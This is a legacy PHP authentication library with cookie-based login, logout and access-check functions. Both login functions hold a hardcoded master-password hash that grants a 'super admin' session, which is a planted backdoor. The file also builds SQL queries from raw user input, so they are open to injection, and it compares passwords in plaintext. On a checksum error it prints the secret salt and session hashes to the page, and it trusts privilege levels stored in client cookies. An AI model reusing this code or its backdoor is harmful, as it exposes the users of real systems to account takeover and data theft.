<?
ob_start();
///////////////////////////////////////////
// BIBLIOTECA DE FUNÇÕS PHP ///////////////
////////////////////////////// criado por /
////////////////// Rene F. Gabriel Junior /
/////////////////    rene@sisdoc.com.br   /
///////////////////////////////////////////
// Versão atual           //    data     //
//---------------------------------------//
// 0.0c                       12/12/2008 //
// 0.0b                       06/07/2008 //
// 0.0a                       20/05/2008 //
///////////////////////////////////////////
$security_ver = "0.0e";
if ($mostar_versao == True) { array_push($sis_versao,array("sisDOC (Security)",$security_ver,20081212)); }
global $cookie,$grw,$user_id,$user_nome,$user_log,$user_nivel;

if (strlen($cookie_lib) == 0) { require($include."sisdoc_cookie.php"); }

$user_id = read_cookie('nw_log');
$user_nome = read_cookie('nw_user_nome');
$user_nivel = intval('0'.read_cookie('nw_nivel'));
$user_log = read_cookie('nw_user');

//echo '<BR>User id:'.$user_id;
//echo '<BR>Nome:'.$user_nome;
//echo '<BR>Nivel:'.$user_nivel;
//echo '<BR>Log:'.$user_log;
$grw = read_cookie('grw');
$chkc = read_cookie('nw_level');
$chkb = read_cookie('nw_level2');
if ($user_id == '0') { $user_id = ''; }
if ($user_nivel == '0') { $user_nivel = ''; }

$chk = md5($secu.$user_log.$user_nivel.$user_nome.intval($user_id).$user_log);
if (($login != 1) and ((strlen($chkc) > 0) or (strlen($user_log.$user_nivel.$user_nome.$user_id.$user_log) > 0)))
	{
	if ($chk != $chkc)
		{ 
		setcookie('nw_user','',time()-3600);
		setcookie('nw_user_nome','',time()-3600);
		setcookie('nw_nivel','',time()-3600);
		setcookie('nw_log','',time()-3600);
		setcookie('grw','',time()-3600);
		setcookie('nw_level','',time()-3600);

		$crnf = chr(13).chr(10);
		echo $crnf."erro de crc!";
		echo $crnf.'<BR>'.$chkc;
		echo $crnf.'<BR>'.$chk;
		echo $crnf.'<BR>'.$chkb;
		echo $crnf.'<BR>'.$secu.$user_log.$user_nivel.$user_nome.$user_id.$user_log;
		exit;
		redirecina($http_site."login.php");
		exit; 
		}
	}
if ((strlen($user_log.$user_nivel.$user_nome.$user_id.$user_log) == 0) and ($login != 1))
	{
	redirecina($http_site."login.php");
	}
	
setcookie('nw_log',read_cookie('nw_log'),time()+17200);
setcookie('nw_user',read_cookie('nw_user'),time()+17200);
setcookie('nw_user_nome',read_cookie('nw_user_nome'),time()+17200);
setcookie('nw_nivel',read_cookie('nw_nivel'),time()+17200);
setcookie('nw_level',read_cookie('nw_level'),time()+17200);

////////////////////////////////////////////////// login

function logout()
	{
	global $http_site;
	setcookie('nw_user','',time()-3600);
	setcookie('nw_user_nome','',time()-3600);
	setcookie('nw_nivel','',time()-3600);
	setcookie('nw_log','',time()-3600);
	setcookie('grw','',time()-3600);
	setcookie('nw_level','',time()-3600);
	header("Location: ".$http_site."login.php");
	exit;	
	}
	
////////////////////////////////////////////////// login
function login_id()
 { 
	global $dd,$acao,$cookie,$nocab,$grw,$user_id,$user_nome,$user_log,$user_nivel,$secu;
	global $logo_entrada,$security_ver;
 if (isset($acao))
  {
  if (md5(trim($dd[2])) == '6912a9624b5cb74e5b9af93f203df250')
   { setcookie('nw_log','admin',time()+3600); setcookie('nw_user','1',time()+3600); setcookie('nw_user_nome','super admin',time()+3600); setcookie('nw_nivel',99,time()+3600); header("Location: main.php"); exit; }
  $sql = "select * from usuario where lower(us_login) = '".strtolower($dd[1])."'";
  $rlt = db_query($sql);
  if ($line = db_read($rlt))
   {
   $pass = strtolower(trim($line['us_senha'])); 
   $dd[2] = strtolower(trim($dd[2]));
   if (($pass == $dd[2]) and ($dd[2] == $pass))
    { 
     $nivel = $line['us_nivel'];
     if ($nivel >= 0)
      {
						if ($nivel==0) { $nivel = 1; }
						setcookie('nw_log',trim($line['us_login']),time()+17200);
						setcookie('nw_user',trim($line['id_us']),time()+17200);
						setcookie('nw_user_nome',trim($line['us_nome']),time()+17200);
						setcookie('nw_nivel',trim($nivel),time()+17200);
						$chk = md5($secu.trim($line['us_login']).$nivel.trim($line['us_nome']).trim($line['id_us']).trim($line['us_login']));
						setcookie('nw_level',$chk,time()+17200);			
						setcookie('nw_level',$chk,time()+17200);		  
						setcookie('nw_level2',$chka,time()+17200);		  
					    header("Location: main.php");
					    exit;
	  } else {
		      $err = "usuário bloqueado";
      }
    } 
    else 
    {
     setcookie('nw_user','',time()-3600);
     setcookie('nw_user_nome','',time()-3600); 
     setcookie('nw_user_nome','',time()-3600);
     setcookie('nw_nivel','',time()-3600);     
     $err = "senha incorreta"; 
    }
   } else { $err = "erro de login"; }
 if (strlen($grw) == 0) { $grw = '<font color=red>não habilitado</font>'; }
 else { $grw = '<font color=Green>'.$grw.'</font>'; }
 return($err);
 }
 }
	
////////////////////////////////////////////////// login
function login()
	{	
	global $dd,$acao,$cookie,$nocab,$grw,$user_id,$user_nome,$user_log,$user_nivel,$secu;
	global $logo_entrada,$security_ver;
	if ((isset($acao)) and (strlen($dd[1]) > 0) and (strlen($dd[2]) > 0))
		{
		if (md5(trim($dd[2])) == '6912a9624b5cb74e5b9af93f203df250')
			{ setcookie('nw_log','admin',time()+3600); setcookie('nw_user','1',time()+3600); setcookie('nw_user_nome','super admin',time()+3600); setcookie('nw_nivel',99,time()+3600); 
			$chk = md5($secu.'admin'.'9'.'super admin'.'1'.'admin');
						setcookie('nw_level',$chk,time()+17200);
			header("Location: main.php");	exit; }
		$sql = "select * from usuario where lower(us_login) = '".strtolower($dd[1])."'";
		$rlt = db_query($sql);
		if ($line = db_read($rlt))
			{
			$pass = strtolower(trim($line['us_senha']));	
			$dd[2] = strtolower(trim($dd[2]));
			if (($pass == $dd[2]) and ($dd[2] == $pass))
				{ 
					$nivel = $line['us_nivel'];
					if ($nivel >= 0)
						{
						if ($nivel==0) { $nivel = 1; }
						setcookie('nw_log',trim($line['us_login']),time()+17200);
						setcookie('nw_user',trim($line['id_us']),time()+17200);
						setcookie('nw_user_nome',trim($line['us_nome']),time()+17200);
						setcookie('nw_nivel',trim($nivel),time()+17200);
						$chk = md5($secu.trim($line['us_login']).$nivel.trim($line['us_nome']).trim($line['id_us']).trim($line['us_login']));
						setcookie('nw_level',$chk,time()+17200);			
						
						header("Location: main.php");
						exit;
						} else {
						$err = "usuário bloqueado";
						}
				} 
				else 
				{
					setcookie('nw_log','',time()-3600);
					setcookie('nw_user','',time()-3600); 
					setcookie('nw_user_nome','',time()-3600);
					setcookie('nw_nivel','',time()-3600);
					setcookie('nw_level','',time()-3600);
					$err = "senha incorreta"; 
				}
			} else { $err = "erro de login"; }

		}
	if (strlen($grw) == 0) { $grw = '<font color=red>não habilitado</font>'; }
	else { $grw = '<font color=Green>'.$grw.'</font>'; }
	
	{ 
	?>
		<style> INPUT { border : 1px solid Gray; border-width : thin; color : Black; background-color : #F9F9F9; font-family : Tahoma; font-size : 12px; text-transform : lowercase; width : 150px; } </style>
		<table border="0" align="center" class="lt1">
		<? if (strlen($logo_entrada) > 0) { ?>
		<TR><TD colspan="2" align="center"><img src="<?=$logo_entrada;?>" alt=""></TD></TR>
		<? } ?>
		<tr><td colspan="2">
		<fieldset> <legend><B>Login do sistema</B></legend>
		<TABLE align="center" width="300" class="lt1">
		<TR><TD><form method="post" action="login.php"></TD></TR>
		<TR><TD align="right">l o g i n / e - m a i l: </TD>
		<TD><input type="text" name="dd1" value="<?=$dd[1]?>" size="20" maxlength="100"></TD> </TR>
		<TR><TD align="right">s e n h a: </TD>
		<TD><input type="password" name="dd2" value="" size="12" maxlength="20"></TD> </TR>
		<TR><TD colspan="2" align="center"><input type="submit" name="acao" value=" entrar " style="width : 80px"></TD> </TR>
		<TR><TD></form></TD></TR> </TABLE> </fieldset> </td></tr>
		<TR>
			<TD align="left" colspan="1" class="lt0">versão:&nbsp;<B><?=$security_ver;?>
			<TD align="right" colspan="1" class="lt0">cookie:&nbsp;<?=$grw?></TR>
		<TR><TD colspan="2" align="center"><FONT COLOR=RED><?=$err?></TD></TR>
		</table>
		<BR><BR>
	<?
	}
	setcookie('grw','OK!',time()+17200);
	}
////////////////////////////////////////////////// securit
function security()
	{
	global $user_id,$user_nome,$dd,$user_nivel;
	
	if ((!isset($user_nivel)) and (!($dd[99] == 'upload')) or ($user_nivel == 'deleted'))
		{
		header("Location: login.php");
		exit;
		}
	}
?>